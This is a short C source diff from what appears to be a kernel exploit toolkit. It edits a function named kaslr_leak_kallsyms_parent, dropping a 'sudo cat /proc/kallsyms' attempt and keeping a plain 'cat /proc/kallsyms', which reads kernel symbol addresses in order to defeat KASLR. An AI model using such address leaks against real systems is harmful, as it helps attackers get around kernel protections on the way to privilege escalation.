@@ -2,19 +2,14 @@
 #include "kaslr.h"
 #include <sys/wait.h>
 
-/* ---------- Strategy 1: kallsyms via sudo in parent ---------- */
+/* ---------- Strategy 1: kallsyms in parent namespace ---------- */
 
 int kaslr_leak_kallsyms_parent(struct kaslr_ctx *out)
 {
     memset(out, 0, sizeof(*out));
 
-    FILE *fp = popen(
-        "sudo cat /proc/kallsyms 2>/dev/null", "r");
-    if (!fp) {
-        /* Fallback: try without sudo */
-        fp = popen("cat /proc/kallsyms 2>/dev/null", "r");
-        if (!fp) return -1;
-    }
+    FILE *fp = popen("cat /proc/kallsyms 2>/dev/null", "r");
+    if (!fp) return -1;
 
     int found = 0;
     char line[512];
